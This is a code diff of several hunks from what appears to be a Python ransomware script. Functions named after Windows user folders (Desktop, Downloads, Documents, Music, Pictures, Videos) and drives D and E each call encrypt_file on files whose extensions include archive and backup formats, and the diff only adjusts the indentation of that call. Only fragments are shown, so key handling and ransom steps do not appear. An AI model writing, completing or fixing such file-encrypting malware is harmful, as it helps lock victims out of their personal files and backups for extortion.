@@ -230,7 +230,7 @@ def C_drive_desktop():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -301,7 +301,7 @@ def C_drive_downloads():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -372,7 +372,7 @@ def C_drive_documents():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -443,7 +443,7 @@ def C_drive_music():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -514,7 +514,7 @@ def C_drive_pictures():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -585,7 +585,7 @@ def C_drive_videos():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -657,7 +657,7 @@ def D_drive():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
@@ -728,7 +728,7 @@ def E_drive():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                               encrypt_file(l, key)
+                                encrypt_file(l, key)
             else:
                 shit = 12
 
